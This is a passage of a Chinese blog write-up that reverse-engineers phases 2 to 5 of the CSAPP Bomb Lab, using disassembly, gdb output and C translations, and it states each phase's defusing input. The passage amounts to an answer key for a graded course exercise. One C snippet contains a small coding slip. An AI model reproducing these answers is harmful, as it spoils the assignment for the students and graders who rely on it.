sscanf函数的第3个可变参数，第5个参数, 通过%r8传递</span><br><span class="line">   0x0000000000401480 &lt;+36&gt;:    mov    $0x4025c3,%esi	# sscanf函数的第2个参数，通过%esi传递，0x4025c3地址的格式化字符串为&quot;%d %d %d %d %d %d&quot;，表示输入字符串应该为6个整数</span><br><span class="line">   0x0000000000401485 &lt;+41&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x000000000040148a &lt;+46&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x000000000040148f &lt;+51&gt;:    cmp    $0x5,%eax		# sscanf读入的可变参数需大于5个，否则爆炸</span><br><span class="line">   0x0000000000401492 &lt;+54&gt;:    jg     0x401499 &lt;read_six_numbers+61&gt;</span><br><span class="line">   0x0000000000401494 &lt;+56&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401499 &lt;+61&gt;:    add    $0x18,%rsp</span><br><span class="line">   0x000000000040149d &lt;+65&gt;:    retq</span><br></pre></td></tr></table></figure>

<p>查看<code>0x400f02</code>, <code>0x401463 ~ 0x40147c</code>处的代码，我们可以把调用者<code>phase_2</code>中的<code>$rsp</code>看作一个一维数组的首地址，该数组的长度为6，内容依次为<code>$rsp</code>, <code>$rsp + 4</code>, <code>$rsp + 8</code>, <code>$rsp + 12</code>, <code>$rsp + 16</code>, <code>$rsp + 20</code>，用于 保存<code>sscanf</code>函数执行后生成的6个整数。</p>
<h4 id="炸弹用sscanf读取并解析用户输入字符串"><a href="#炸弹用sscanf读取并解析用户输入字符串" class="headerlink" title="炸弹用sscanf读取并解析用户输入字符串"></a>炸弹用sscanf读取并解析用户输入字符串</h4><p>注意到<code>0x40148a</code>处调用<code>sscanf</code>函数，作用是从用户输入的字符串<code>%rdi</code>中解析出6个整数，保存到调用者<code>phase_2</code>中的<code>$rsp</code></p>
<p>C语言中<code>sscanf</code>函数原型如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sscanf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br></pre></td></tr></table></figure>

<p>对照汇编代码， <code>$rdi</code>相当于<code>sscanf</code>的参数<code>str</code>；查看<code>0x401480</code>代码，<code>$esi</code>相当于<code>sscanf</code>的参数<code>format</code>， 用gdb查看<code>0x4025c3</code>处的字符串，为<code>&quot;%d %d %d %d %d %d&quot;</code>， 说明<code>sscanf</code>中的可变参数个数为6，且都是指向<code>int</code>类型的地址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x4025c3</span><br><span class="line">0x4025c3:       &quot;%d %d %d %d %d %d&quot;</span><br></pre></td></tr></table></figure>

<p>可以看出<code>sscanf</code>函数实际上接收8个入参。<code>read_six_numbers</code>利用<code>%rdi</code>,  <code> %rsi</code>，<code>%rdx</code>, <code>%rcx</code>, <code>%r8</code>, <code>%r9</code>分别传递用户输入字符串、格式化字符串、6个整数中的前4个。而第5、6个整数超出了六个参数，需通过栈传递。</p>
<p><strong>到此，确定了第二关需要输入6个整数, 且这6个整数保存在调用者<code>phase_2</code>的<code>%rsp</code>中</strong>，用gdb验证这个结论：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb bomb</span><br><span class="line">(gdb) set args answer 	# 第二行可随便输入6个数，例如1 2 3 4 5 6</span><br><span class="line">(gdb) b *0x400f0a</span><br><span class="line">(gdb) c</span><br><span class="line">Breakpoint 3, 0x0000000000400f0a in phase_2 ()</span><br><span class="line">(gdb) x/6x $rsp			# 查看$rsp, 和输入字符串中6个数一致</span><br><span class="line">0x7fffffffe420: 0x00000001      0x00000002      0x00000003      0x00000004</span><br><span class="line">0x7fffffffe430: 0x00000005      0x00000006</span><br></pre></td></tr></table></figure>

<p>再看下<code>phase_2</code>完整代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:   55                      push   %rbp</span><br><span class="line">  400efd:   53                      push   %rbx</span><br><span class="line">  400efe:   48 83 ec 28             sub    $0x28,%rsp</span><br><span class="line">  400f02:   48 89 e6                mov    %rsp,%rsi 			# %rsi作为read_six_numbers的第二个入参传递, $rsp既是入参也是出参；第一个入参为$rdi, 即用户输入的字符串</span><br><span class="line">  400f05:   e8 52 05 00 00          callq  40145c &lt;read_six_numbers&gt; # 读六个数字</span><br><span class="line">  400f0a:   83 3c 24 01             cmpl   $0x1,(%rsp) 			# %rsp为调用者保存寄存器，过程调用前后值不变，因此保存的是read_six_numbers输出的6个数，(%rsp)保存的是第一个整数</span><br><span class="line">  400f0e:   74 20                   je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f10:   e8 25 05 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:   eb 19                   jmp    400f30 &lt;phase_2+0x34&gt;# 将6个整数看作一个数组</span><br><span class="line">  400f17:   8b 43 fc                mov    -0x4(%rbx),%eax		# 将数组前一个数保存到%eax</span><br><span class="line">  400f1a:   01 c0                   add    %eax,%eax			# 将%eax乘以2</span><br><span class="line">  400f1c:   39 03                   cmp    %eax,(%rbx)			# 判断当前整数是否为前一个数的两倍， 不等则爆炸，相等跳转到400f25，</span><br><span class="line">  400f1e:   74 05                   je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">  400f20:   e8 15 05 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:   48 83 c3 04             add    $0x4,%rbx			# 每次循环，将rbx值加4，即指向数组的下一个元素</span><br><span class="line">  400f29:   48 39 eb                cmp    %rbp,%rbx			# rbp指向数组结尾，标识循环是否结束</span><br><span class="line">  400f2c:   75 e9                   jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:   eb 0c                   jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:   48 8d 5c 24 04          lea    0x4(%rsp),%rbx 		# 最初rbx指向第二个数，</span><br><span class="line">  400f35:   48 8d 6c 24 18          lea    0x18(%rsp),%rbp  	# %rbp = $rsp + 24</span><br><span class="line">  400f3a:   eb db                   jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:   48 83 c4 28             add    $0x28,%rsp</span><br><span class="line">  400f40:   5b                      pop    %rbx</span><br><span class="line">  400f41:   5d                      pop    %rbp</span><br><span class="line">  400f42:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>由<code>0x400f0a: cmpl  $0x1,(%rsp)</code>可知，第一个整数一定是1，然后跳转到<code>0x400f30</code>进入循环。</p>
<p>将这6个数看作一个数组， 由<code>0x400f30</code>处代码，<code>$rbx</code>可看作这个数组的下标，初始值为1，指向第2个整数；由<code>0x400f35</code>处代码，<code>$rbp</code>标识着数组的结尾，用于判断循环是否退出。</p>
<p>由<code>0x400f17</code> ~ <code>0x400f1c</code>代码可知，每次循环判断数组当前元素是否为前一个元素的两倍，不等则爆炸。因此答案为<code>1 2 4 8 16 32</code>， 唯一解。</p>
<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p><code>phase_3</code>的代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:   48 83 ec 18             sub    $0x18,%rsp</span><br><span class="line">  400f47:   48 8d 4c 24 0c          lea    0xc(%rsp),%rcx		# 第二个整数位于$rsp + 12</span><br><span class="line">  400f4c:   48 8d 54 24 08          lea    0x8(%rsp),%rdx		# 第一个整数位于%rsp + 8</span><br><span class="line">  400f51:   be cf 25 40 00          mov    $0x4025cf,%esi		# 查看0x4025cf地址处内存，为&quot;%d %d&quot;，表示接受两个整数作为输入</span><br><span class="line">  400f56:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  400f5b:   e8 90 fc ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:   83 f8 01                cmp    $0x1,%eax			# sscanf返回值需大于1，否则爆炸。说明可变参数个数为2</span><br><span class="line">  400f63:   7f 05                   jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">  400f65:   e8 d0 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:   83 7c 24 08 07          cmpl   $0x7,0x8(%rsp)		# 第一个数必须小于7，否则爆炸</span><br><span class="line">  400f6f:   77 3c                   ja     400fad &lt;phase_3+0x6a&gt;# 比较结果大于0则跳转</span><br><span class="line">  400f71:   8b 44 24 08             mov    0x8(%rsp),%eax</span><br><span class="line">  400f75:   ff 24 c5 70 24 40 00    jmpq   *0x402470(,%rax,8)	# 跳转表结构，对应C语言中的switch语句</span><br><span class="line">  400f7c:   b8 cf 00 00 00          mov    $0xcf,%eax			# %rax = 0，跳转到400f7c</span><br><span class="line">  400f81:   eb 3b                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f83:   b8 c3 02 00 00          mov    $0x2c3,%eax</span><br><span class="line">  400f88:   eb 34                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f8a:   b8 00 01 00 00          mov    $0x100,%eax</span><br><span class="line">  400f8f:   eb 2d                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f91:   b8 85 01 00 00          mov    $0x185,%eax</span><br><span class="line">  400f96:   eb 26                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f98:   b8 ce 00 00 00          mov    $0xce,%eax</span><br><span class="line">  400f9d:   eb 1f                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f9f:   b8 aa 02 00 00          mov    $0x2aa,%eax</span><br><span class="line">  400fa4:   eb 18                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fa6:   b8 47 01 00 00          mov    $0x147,%eax</span><br><span class="line">  400fab:   eb 11                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:   e8 88 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  400fb7:   eb 05                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:   b8 37 01 00 00          mov    $0x137,%eax</span><br><span class="line">  400fbe:   3b 44 24 0c             cmp    0xc(%rsp),%eax		# 判断%eax值与第二个参数是否相等，不等则爆炸</span><br><span class="line">  400fc2:   74 05                   je     400fc9 &lt;phase_3+0x86&gt;</span><br><span class="line">  400fc4:   e8 71 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:   48 83 c4 18             add    $0x18,%rsp</span><br><span class="line">  400fcd:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>与第二关类似，查看<code>0x400f51</code>处代码<code>mov $0x4025cf $esi</code> , 用gdb打印<code>0x4025cf</code>处内存，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x4025cf</span><br><span class="line">0x4025cf:       &quot;%d %d&quot;</span><br></pre></td></tr></table></figure>

<p>内容为<code>&quot;%d %d&quot;</code>，表示这一关需要输入两个整数。</p>
<p>由<code>400f47 ~ 400f4c</code>代码可知，第一个整数位于<code>$rsp + 8</code>地址，第二个整数位于<code>$rsp + 12</code>地址</p>
<h4 id="确认这两个整数应满足的条件"><a href="#确认这两个整数应满足的条件" class="headerlink" title="确认这两个整数应满足的条件"></a>确认这两个整数应满足的条件</h4><p>观察<code>0x400f6a</code>处的<code>cmp</code>指令。注意比较顺序，是计算<code>*(%rsp + 8) - 7</code> 的值，再判断这个值是否大于<code>0</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">400f6a:   83 7c 24 08 07          cmpl   $0x7,0x8(%rsp)		# 第一个数必须小于7，否则爆炸</span><br><span class="line">400f6f:   77 3c                   ja     400fad				# 引爆炸弹</span><br></pre></td></tr></table></figure>

<p>以上两句汇编等同于 <code>if (*rsp+8) &gt; 7, 跳转到0x400fad</code>， 因此第一个数必须不大于7。</p>
<p><code>0x400f75</code>处<code>jmpq *0x402470(,%rax,8)</code>是一个间接跳转指令, 可以看出这段代码是典型的switch语句，跳转表就存在于<code>0x402470</code>。<code>%rax</code>取值为[0, 7]，代表switch语句中8条不同的case。 打印这张跳转表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/8g 0x402470</span><br><span class="line">0x402470:       0x0000000000400f7c      0x0000000000400fb9</span><br><span class="line">0x402480:       0x0000000000400f83      0x0000000000400f8a</span><br><span class="line">0x402490:       0x0000000000400f91      0x0000000000400f98</span><br><span class="line">0x4024a0:       0x0000000000400f9f      0x0000000000400fa6</span><br></pre></td></tr></table></figure>

<p>举例，第一个整数取0时，会跳转到<code>0x400f7c</code>, 将<code>0xcf</code>赋给<code>%rax</code>，<code>0x400fbe</code>处再判断<code>$rax</code>和第二个整数是否相等。因此<code>0 207</code>为满足条件的一组解。依次类推，一共得到8组解，答案不唯一，任选一种即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 207</span><br><span class="line">1 311</span><br><span class="line">2 707</span><br><span class="line">3 256</span><br><span class="line">4 389</span><br><span class="line">5 206</span><br><span class="line">6 682</span><br><span class="line">7 327</span><br></pre></td></tr></table></figure>

<p>switch语句和跳转表内容可参考 《CSAPP 原书第3版》 3.6.8小节 —— switch语句。</p>
<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p><code>phase_4</code>的代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:   48 83 ec 18             sub    $0x18,%rsp</span><br><span class="line">  401010:   48 8d 4c 24 0c          lea    0xc(%rsp),%rcx		# 第二个整数，用$rcx保存</span><br><span class="line">  401015:   48 8d 54 24 08          lea    0x8(%rsp),%rdx		# 第一个整数，用%rdx保存</span><br><span class="line">  40101a:   be cf 25 40 00          mov    $0x4025cf,%esi		# %rsi处字符串: &quot;%d %d&quot;</span><br><span class="line">  40101f:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  401024:   e8 c7 fb ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  401029:   83 f8 02                cmp    $0x2,%eax</span><br><span class="line">  40102c:   75 07                   jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">  40102e:   83 7c 24 08 0e          cmpl   $0xe,0x8(%rsp)		# 将第一个整数和14比较</span><br><span class="line">  401033:   76 05                   jbe    40103a &lt;phase_4+0x2e&gt;# 如果不大于14跳转，否则引爆炸弹</span><br><span class="line">  401035:   e8 00 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40103a:   ba 0e 00 00 00          mov    $0xe,%edx 			# func4函数的第一个入参，初值为14</span><br><span class="line">  40103f:   be 00 00 00 00          mov    $0x0,%esi 			# func4函数的第二个入参，初值为0</span><br><span class="line">  401044:   8b 7c 24 08             mov    0x8(%rsp),%edi 		# func4函数的第三个入参，初值为输入的第一个整数</span><br><span class="line">  401048:   e8 81 ff ff ff          callq  400fce &lt;func4&gt;		# 调用func4, func4为递归函数</span><br><span class="line">  40104d:   85 c0                   test   %eax,%eax			# func4函数必须返回0，否则爆炸</span><br><span class="line">  40104f:   75 07                   jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line">  401051:   83 7c 24 0c 00          cmpl   $0x0,0xc(%rsp)		# 第二个整数必须为0， 否则爆炸</span><br><span class="line">  401056:   74 05                   je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">  401058:   e8 dd 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40105d:   48 83 c4 18             add    $0x18,%rsp</span><br><span class="line">  401061:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>同样的，先确认输入字符串的格式，查看<code>0x4025cf</code>处的格式化字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x4025cf</span><br><span class="line">0x4025cf:       &quot;%d %d&quot;</span><br></pre></td></tr></table></figure>

<p>内容为<code>&quot;%d %d&quot;</code>， 说明需要输入两个整数。第一个整数位于<code>%rsp + 8</code>， 第二个整数位于<code>%rsp + 12</code></p>
<p>由<code>0x40102e ~ 0x401033</code>代码可知，第一个整数必须不大于14， 否则引爆炸弹。</p>
<p>注意到<code>0x401048</code>处调用<code>func4</code>函数，并判断该函数返回值是否为0，不等于0则引爆炸弹。</p>
<p>由<code>0x40103a ~ 0x401044</code>三条语句可知，<code>func4</code>函数接受三个入参，且三个参数的初始值从左到右分别为输入的第一个整数,<code>14</code>, <code>0</code>。下面查看<code>func4</code>代码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># int func4(int x, int y, int z);</span><br><span class="line"># x in %edi, y in $esi, z in $edx, ret in $eax</span><br><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">  400fce:   48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">  400fd2:   89 d0                   mov    %edx,%eax 			# ret = z</span><br><span class="line">  400fd4:   29 f0                   sub    %esi,%eax			# ret -= y</span><br><span class="line">  400fd6:   89 c1                   mov    %eax,%ecx			# ecx = ret</span><br><span class="line">  400fd8:   c1 e9 1f                shr    $0x1f,%ecx			# ecx = (ecx &gt;&gt; 31) &amp; 0x1</span><br><span class="line">  400fdb:   01 c8                   add    %ecx,%eax			# ret += ecx</span><br><span class="line">  400fdd:   d1 f8                   sar    %eax					# ret &gt;&gt;= 1</span><br><span class="line">  400fdf:   8d 0c 30                lea    (%rax,%rsi,1),%ecx	# ecx = ret + y</span><br><span class="line">  400fe2:   39 f9                   cmp    %edi,%ecx</span><br><span class="line">  400fe4:   7e 0c                   jle    400ff2 &lt;func4+0x24&gt;	# if ecx &lt;= x, jump to 0x400ff2</span><br><span class="line">  400fe6:   8d 51 ff                lea    -0x1(%rcx),%edx		# z = rcx - 1</span><br><span class="line">  400fe9:   e8 e0 ff ff ff          callq  400fce &lt;func4&gt;</span><br><span class="line">  400fee:   01 c0                   add    %eax,%eax			# ret *= 2</span><br><span class="line">  400ff0:   eb 15                   jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ff2:   b8 00 00 00 00          mov    $0x0,%eax			# ret = 0</span><br><span class="line">  400ff7:   39 f9                   cmp    %edi,%ecx</span><br><span class="line">  400ff9:   7d 0c                   jge    401007 &lt;func4+0x39&gt;	# if ecx &gt;= x, jump to 0x401007</span><br><span class="line">  400ffb:   8d 71 01                lea    0x1(%rcx),%esi		# y = ecx + 1</span><br><span class="line">  400ffe:   e8 cb ff ff ff          callq  400fce &lt;func4&gt;		# ret = func(x, y, z)</span><br><span class="line">  401003:   8d 44 00 01             lea    0x1(%rax,%rax,1),%eax# ret = 2 * ret + 1</span><br><span class="line">  401007:   48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">  40100b:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>由<code>400fe9</code>和<code>400ffe</code>处的<code>callq 400fce &lt;func4&gt;</code>指令可知发生了递归调用。我们可以将<code>func4</code>的汇编代码逐句翻译成C语言，将第一个整数从0取到14依次调用<code>func4</code>函数，看哪些取值能成功返回<code>0</code>。这里需要了解<code>add</code>,<code> sub</code>,<code> sar</code>,<code> shr</code>,<code>lea</code>,<code> jle</code>等指令的用法以及注意操作数的顺序。</p>
<p><code>func4</code>的递归过程，可以转换为如下的C语言函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// x in %edi, y in $esi, z in $edx, ret in %eax</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func4</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span> &#123;</span><br><span class="line">    <span class="type">int</span> ecx;</span><br><span class="line">    <span class="type">int</span> ret = z - y;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(z &lt; y) &#123;</span><br><span class="line">        ret += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ret &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    ecx = ret + y;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ecx == x) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ecx &lt;= x) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * func4(x, ecx + <span class="number">1</span>, z) + <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * func4(x, y, ecx - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">14</span>; ++i)</span><br><span class="line">        <span class="keyword">if</span>(func4(i, <span class="number">0</span>, <span class="number">14</span>) == <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;answer: %d\n&quot;</span>, i);	<span class="comment">// 打印出第一个整数的所有取值</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译执行C程序，发现第一个整数可以是<code>0</code>， <code>1</code>， <code>3</code>， <code>7</code></p>
<p>由<code>phase_4</code>的<code>0x401051 ~ 0x401056</code>代码可知，第二个整数必须为<code>0</code>，否则引爆炸弹。</p>
<p>因此，一共得到四组解，答案不唯一，任选一种即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 0</span><br><span class="line">1 0</span><br><span class="line">3 0</span><br><span class="line">7 0</span><br></pre></td></tr></table></figure>

<h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p><code>phase_5</code>的代码如下, 根据<code>0x40107f</code>处的<code>cmp $0x6, %eax</code>指令，可确定这关需要输入长度为6的字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:</span><br><span class="line">  401062:   53                      push   %rbx</span><br><span class="line">  401063:   48 83 ec 20             sub    $0x20,%rsp</span><br><span class="line">  401067:   48 89 fb                mov    %rdi,%rbx			# rbx保存输入字符串</span><br><span class="line">  40106a:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax</span><br><span class="line">  401071:   00 00</span><br><span class="line">  401073:   48 89 44 24 18          mov    %rax,0x18(%rsp)</span><br><span class="line">  401078:   31 c0                   xor    %eax,%eax</span><br><span class="line">  40107a:   e8 9c 02 00 00          callq  40131b &lt;string_length&gt;</span><br><span class="line">  40107f:   83 f8 06                cmp    $0x6,%eax			# 输入字符串的长度必须为6,否则爆炸</span><br><span class="line">  401082:   74 4e                   je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  401084:   e8 b1 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401089:   eb 47                   jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  40108b:   0f b6 0c 03             movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">  40108f:   88 0c 24                mov    %cl,(%rsp)</span><br><span class="line">  401092:   48 8b 14 24             mov    (%rsp),%rdx</span><br><span class="line">  401096:   83 e2 0f                and    $0xf,%edx 			# 将当前字符与上0xf，结果保存在%edx</span><br><span class="line">  401099:   0f b6 92 b0 24 40 00    movzbl 0x4024b0(%rdx),%edx  # 将(0x4024b0+%edx)处的字符保存在%rdx</span><br><span class="line">  4010a0:   88 54 04 10             mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">  4010a4:   48 83 c0 01             add    $0x1,%rax			# 每次循环%rax加1</span><br><span class="line">  4010a8:   48 83 f8 06             cmp    $0x6,%rax			# 用%rax循环计数，循环6次</span><br><span class="line">  4010ac:   75 dd                   jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010ae:   c6 44 24 16 00          movb   $0x0,0x16(%rsp)</span><br><span class="line">  4010b3:   be 5e 24 40 00          mov    $0x40245e,%esi		# 0x40245e处字符串为flyers</span><br><span class="line">  4010b8:   48 8d 7c 24 10          lea    0x10(%rsp),%rdi		# 这里需要构造输入串，使得(%rsp+0x10)处的串等于&quot;flyers&quot;</span><br><span class="line">  4010bd:   e8 76 02 00 00          callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  4010c2:   85 c0                   test   %eax,%eax</span><br><span class="line">  4010c4:   74 13                   je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010c6:   e8 6f 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4010cb:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4010d0:   eb 07                   jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010d2:   b8 00 00 00 00          mov    $0x0,%eax			# 循环开始，eax初值为0</span><br><span class="line">  4010d7:   eb b2                   jmp    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010d9:   48 8b 44 24 18          mov    0x18(%rsp),%rax</span><br><span class="line">  4010de:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax</span><br><span class="line">  4010e5:   00 00</span><br><span class="line">  4010e7:   74 05                   je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line">  4010e9:   e8 42 fa ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4010ee:   48 83 c4 20             add    $0x20,%rsp</span><br><span class="line">  4010f2:   5b                      pop    %rbx</span><br><span class="line">  4010f3:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>根据<code>jmp 40108b &lt;phase_5+0x29&gt;</code>，看出这段代码是循环。<code>%eax</code>初始为0， 每次循环将%eax加1，再和<code>6</code>进行比较(<code>0x4010a8</code>)。循环结束后调用<code>strings_not_equal</code>,将<code>0x40245e</code>处的字符串和<code>$rsp + 0x10</code>比较，两个字符串必须相等，否则爆炸。先查看<code>0x40245e</code>处的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x40245e</span><br><span class="line">0x40245e:       &quot;flyers&quot;</span><br></pre></td></tr></table></figure>

<p>内容为<code>flyers</code>， 再看看<code>$rsp + 0x10</code>处的字符串是怎么来的：</p>
<p>从<code>0x401067: mov %rdi,%rbx</code>看出，我们输入的字符串位于<code>%rbx</code>。这里依次将<code>%rbx</code>的每一个字符先与<code>0xf</code>做与运算，然后加上<code>0x4024b0</code>得到新的地址<code>x</code>, 最后取地址<code>x</code>处的字符作为输出；循环结束后，输出一个长度为6的字符串，将以上逻辑改写为如下C代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">phase_5</span><span class="params">(<span class="type">char</span> str[<span class="number">6</span>])</span> &#123;	<span class="comment">// str表示用户输入的字符串</span></span><br><span class="line">	<span class="type">char</span> res[<span class="number">6</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">		res[i] = *(<span class="type">char</span> *)((str[i] &amp; <span class="number">0xf</span>) + <span class="number">0x4024b0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> !<span class="built_in">strcmp</span>(res[i], <span class="string">&quot;flyers&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，我们只需确定<code>0x4024b0</code>处的内容，然后对照ASCII码表，即可得到答案。</p>
<p>先查看<code>0x4024b0</code>， 只需查看前16个字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/16c 0x4024b0</span><br><span class="line">0x4024b0 &lt;array.3449&gt;  : 109 &#x27;m&#x27; 97 &#x27;a&#x27;  100 &#x27;d&#x27; 117 &#x27;u&#x27; 105 &#x27;i&#x27; 101 &#x27;e&#x27; 114 &#x27;r&#x27; 115 &#x27;s&#x27;</span><br><span class="line">0x4024b8 &lt;array.3449+8&gt;: 110 &#x27;n&#x27; 102 &#x27;f&#x27; 111 &#x27;o&#x27; 116 &#x27;t&#x27; 118 &#x27;v&#x27; 98 &#x27;b&#x27;  121 &#x27;y&#x27; 108 &#x27;l&#x27;</span><br></pre></td></tr></table></figure>

<p>发现<code>flyers</code>中的每个字符都可以找到。根据偏移确定输入的每个字符的ASCII码最低一个字节依次为<code>0x9, 0xF, 0xE, 0x5, 0x6, 0x7</code>, 答案不唯一。对照ASCII码表 <a href="http://ascii.911cha.com/%EF%BC%8C">http://ascii.911cha.com/，</a> 我们找到一组解：<code>IONUVW</code></p>
<table>
<thead>
<tr>
<th>二进制</th>
<th>十进制</th>
<th>十六进制</th>
<th>图形</th>
</tr>
</thead>
<tbody><tr>
<td>0100 1001</td>
<td>73</td>
<td>49</td>
<td>I</td>
</tr>
<tr>
<td>0100 1111</td>
<td>79</td>
<td>4F</td>
<td>O</td>
</tr>
<tr>
<td>0100 1110</td>
<td>78</td>
<td>4E</td>
<td>N</td>
</tr>
<tr>
<td>0101 0101</td>
<td>85</td>
<td>55</td>
<td>U</td>
</tr>
<tr>
<td>0101 0110</td>
<td>86</td>
<td>56</td>
<td>V</td>
</tr>
<tr>
<td>0101 0111</td>
<td>87</td>
